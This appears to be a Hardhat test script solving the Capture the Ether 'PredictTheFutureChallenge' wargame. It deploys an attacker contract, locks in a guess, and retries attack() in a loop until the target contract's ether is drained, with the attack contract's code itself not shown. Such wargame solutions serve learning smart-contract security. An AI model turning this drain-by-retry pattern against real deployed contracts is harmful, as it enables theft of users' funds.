import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    let targetSolver: Contract;

    targetSolver = await (
      await ethers.getContractFactory('PredictTheFutureAttack', attacker)
    ).deploy(target.address, {
      value: utils.parseEther('1'),
    });

    // console.log('Target Solver owner: ', await targetSolver.owner());
    console.log('Attacker: ', attacker.address);

    targetSolver = await targetSolver.connect(attacker);
    await targetSolver.lockInGuess({value: utils.parseEther('1')});
    while(!(await target.isComplete())) {
      try {
        await targetSolver.attack();
      } catch (err) {
        // console.log(err);
      }
    }


    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
